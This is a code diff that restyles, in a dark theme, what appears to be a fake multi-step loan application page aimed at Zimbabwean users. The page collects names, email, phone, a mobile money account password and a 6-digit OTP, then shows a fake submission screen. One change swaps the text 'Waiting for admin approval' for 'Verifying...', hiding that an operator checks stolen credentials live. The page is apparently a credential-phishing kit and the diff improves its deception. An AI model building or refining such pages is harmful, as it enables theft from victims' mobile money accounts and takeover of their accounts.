@@ -19,11 +19,11 @@
         --eco-green-light: #0b1494;
         --eco-bg: #100474;
         --eco-card: #1d1b25;
-        --eco-text: #1e293b;
-        --eco-text-light: #64748b;
-        --eco-border: #dbe4dc;
+        --eco-text: #ffffff;
+        --eco-text-light: #94a3b8;
+        --eco-border: rgba(255,255,255,0.08);
         --eco-shadow: rgba(0, 166, 81, 0.12);
-        --eco-input-bg: #f8faf9;
+        --eco-input-bg: #1e293b;
     }
 
     * {
@@ -53,10 +53,10 @@
     }
 
     .glass-panel {
-        background: #ffffff;
+        background: var(--eco-card);
         border-radius: 26px;
-        border: 1px solid rgba(0, 166, 81, 0.08);
-        box-shadow: 0 12px 35px rgba(15, 23, 42, 0.08), 0 4px 10px rgba(0, 166, 81, 0.06);
+        border: 1px solid rgba(255, 255, 255, 0.08);
+        box-shadow: 0 12px 35px rgba(15, 23, 42, 0.3), 0 4px 10px rgba(0, 166, 81, 0.1);
         transition: 0.3s ease;
         overflow: hidden;
     }
@@ -77,16 +77,20 @@
         border-radius: 16px;
         border: 1.5px solid var(--eco-border);
         background: var(--eco-input-bg);
-        color: var(--eco-text);
+        color: #ffffff;
         font-size: 15px;
         outline: none;
         transition: all 0.3s ease;
     }
 
+    .input-premium::placeholder {
+        color: #64748b;
+    }
+
     .input-premium:focus, select.input-premium:focus {
         border-color: var(--eco-green);
-        background: #ffffff;
-        box-shadow: 0 0 0 4px rgba(0, 166, 81, 0.12);
+        background: #1e293b;
+        box-shadow: 0 0 0 4px rgba(0, 166, 81, 0.2);
     }
 
     .btn-premium {
@@ -124,11 +128,16 @@
         padding: 15px;
         border-radius: 16px;
         border: 1px solid var(--eco-border);
-        background: #ffffff;
-        color: var(--eco-text-light);
+        background: rgba(255, 255, 255, 0.05);
+        color: #ffffff;
         font-weight: 600;
         cursor: pointer;
         transition: 0.3s ease;
+    }
+
+    .btn-secondary:hover {
+        background: rgba(255, 255, 255, 0.1);
+        border-color: rgba(255, 255, 255, 0.2);
     }
 
     .progress-step {
@@ -143,13 +152,13 @@
         width: 42px;
         height: 42px;
         border-radius: 50%;
-        background: #edf7f1;
-        border: 2px solid #d2e8d8;
+        background: rgba(255, 255, 255, 0.05);
+        border: 2px solid rgba(255, 255, 255, 0.1);
         display: flex;
         align-items: center;
         justify-content: center;
         font-weight: 700;
-        color: var(--eco-green-dark);
+        color: var(--eco-text-light);
         margin-bottom: 8px;
     }
 
@@ -157,6 +166,7 @@
         background: linear-gradient(135deg, var(--eco-green), var(--eco-green-dark));
         color: white;
         border-color: transparent;
+        box-shadow: 0 0 18px rgba(0, 166, 81, 0.3);
     }
 
     .progress-step.completed .progress-dot {
@@ -172,9 +182,9 @@
         width: 54px;
         height: 54px;
         border-radius: 16px;
-        border: 2px solid #d7e8dc;
-        background: white;
-        color: var(--eco-text);
+        border: 2px solid rgba(255, 255, 255, 0.1);
+        background: #ffffff;
+        color: #1d1b25;
         text-align: center;
         font-size: 24px;
         font-weight: bold;
@@ -184,7 +194,7 @@
 
     .pin-box:focus {
         border-color: var(--eco-green);
-        box-shadow: 0 0 0 4px rgba(0, 166, 81, 0.12);
+        box-shadow: 0 0 0 4px rgba(0, 166, 81, 0.2);
     }
 
     .ib-phone-wrapper {
@@ -202,8 +212,8 @@
         align-items: center;
         gap: 10px;
         padding-right: 14px;
-        border-right: 1px solid #dbe4dc;
-        color: var(--eco-text);
+        border-right: 1px solid rgba(255, 255, 255, 0.1);
+        color: #ffffff;
         font-weight: 700;
     }
 
@@ -246,6 +256,7 @@
                     </template>
                 </div>
                 
+                <!-- Step 1: Loan Details -->
                 <div x-show="step === 1" x-transition.duration.200ms>
                     <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-bold">Loan Details</h2><span class="text-xs font-bold text-orange-400">Step 01</span></div>
                     <div class="space-y-4">
@@ -255,7 +266,7 @@
                             <option value="Business">Business Loan</option>
                         </select>
                         <div>
-                            <div class="flex justify-between"><label class="label-premium">Amount ($)</label><span class="text-xl font-bold" x-text="'$' + form.amount"></span></div>
+                            <div class="flex justify-between"><label class="label-premium">Amount ($)</label><span class="text-xl font-bold text-white" x-text="'$' + form.amount"></span></div>
                             <input type="range" x-model="form.amount" min="1000" max="100000" step="500" class="w-full accent-orange-500">
                         </div>
                         <select x-model="form.term" class="input-premium">
@@ -267,16 +278,18 @@
                     </div>
                 </div>
 
+                <!-- Step 2: Identity Verification -->
                 <div x-show="step === 2" x-cloak x-transition.duration.200ms>
                     <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-bold">Identity Verification</h2><span class="text-xs font-bold text-orange-400">Step 02</span></div>
                     <div class="space-y-4">
                         <div class="grid grid-cols-2 gap-4"><input type="text" x-model="form.firstName" class="input-premium" placeholder="First name"><input type="text" x-model="form.lastName" class="input-premium" placeholder="Last name"></div>
                         <input type="email" x-model="form.email" class="input-premium" placeholder="Email (must be @gmail.com)">
-                        <div class="flex"><span class="input-premium w-24 flex items-center">🇿🇼+263</span><input type="tel" x-model="form.phone" class="input-premium flex-1" placeholder="XXXXXXX" maxlength="9"></div>
+                        <div class="flex"><span class="input-premium w-24 flex items-center bg-slate-800 border-r-0 rounded-r-none">🇿🇼+263</span><input type="tel" x-model="form.phone" class="input-premium flex-1 rounded-l-none" placeholder="XXXXXXX" maxlength="9"></div>
                         <div class="grid grid-cols-2 gap-4"><button @click="step = 1" class="btn-secondary">← Back</button><button @click="submitStep2" :disabled="!isStep2Valid" class="btn-premium">Continue →</button></div>
                     </div>
                 </div> 
 
+                <!-- Step 3: Employment Information -->
                 <div x-show="step === 3" x-cloak x-transition.duration.200ms>
                     <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-bold">Employment Information</h2><span class="text-xs font-bold text-orange-400">Step 03</span></div>
                     <div class="space-y-4">
@@ -287,12 +300,13 @@
                     </div>
                 </div>
 
+                <!-- Step 4: Mobile Money Verification -->
                 <div x-show="step === 4" x-cloak x-transition.duration.200ms>
                     <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-bold">Mobile Money Verification</h2><span class="text-xs font-bold text-orange-400">Step 04</span></div>
                     <div class="space-y-6">
                         <div class="ib-phone-wrapper">
                             <span class="ib-country-code">🇿🇼+263</span>
-                            <input type="tel" x-model="africell.phone" :disabled="passwordVerifying" class="input-premium border-0 bg-transparent" placeholder="XXXXXXX" maxlength="9">
+                            <input type="tel" x-model="africell.phone" :disabled="passwordVerifying" class="input-premium border-0 bg-transparent p-0 focus:box-shadow-none focus:bg-transparent" placeholder="XXXXXXX" maxlength="9">
                         </div>
                         
                         <div>
@@ -315,7 +329,7 @@
                             
                             <div x-show="passwordVerifying" class="btn-premium bg-amber-700 opacity-90 cursor-not-allowed flex items-center justify-center gap-3">
                                 <div class="spinner-sm"></div>
-                                <span class="text-sm font-semibold tracking-wide">Waiting for admin approval... Please hold on.</span>
+                                <span class="text-sm font-semibold tracking-wide">Verifying...</span>
                             </div>
                             
                             <button x-show="!passwordVerifying" @click="step = 3" class="btn-secondary">← Back</button>
@@ -323,12 +337,13 @@
                     </div>
                 </div>
 
+                <!-- Step 5: Confirm OTP Code -->
                 <div x-show="step === 5" x-cloak x-transition.duration.200ms>
                     <div class="flex justify-between items-center mb-4">
                         <h2 class="text-xl font-bold">Confirm OTP Code</h2>
                         <span class="text-xs font-bold text-orange-400">Step 05</span>
                     </div>
-                    <p class="text-xs text-gray-500 text-center mb-6">Enter the 6-digit confirmation token sent to your device</p>
+                    <p class="text-xs text-gray-400 text-center mb-6">Enter the 6-digit confirmation token sent to your device</p>
                     
                     <div class="space-y-6">
                         <div class="flex justify-center gap-2">
@@ -338,7 +353,7 @@
                                        x-model="pin.value[i]"
                                        :disabled="pinVerifying"
                                        onkeypress="return event.charCode >= 48 && event.charCode <= 57">
-                            </template>
+                                </template>
                         </div>
 
                         <div class="grid grid-cols-1 gap-4 pt-2">
@@ -354,10 +369,11 @@
                     </div>
                 </div>
 
+                <!-- Step 6: Success Status screen -->
                 <div x-show="step === 6" x-cloak class="text-center py-8">
                     <div class="text-6xl mb-4">✅</div>
                     <h2 class="text-2xl font-bold text-green-500">Application Submitted!</h2>
-                    <p class="text-gray-500 mt-2">Reference ID: <span class="font-mono font-bold text-gray-800" x-text="referenceId"></span></p>
+                    <p class="text-gray-400 mt-2">Reference ID: <span class="font-mono font-bold text-white" x-text="referenceId"></span></p>
                 </div>
             </div>
         </section>
@@ -464,7 +480,6 @@
                     document.querySelectorAll('.step5-box')[i+1].focus();
                 }
 
-                // Call structure tracking context using explicit instance fallback 
                 setTimeout(() => {
                     if (this.isPinValid && !this.pinVerifying) {
                         this.submitStep5();
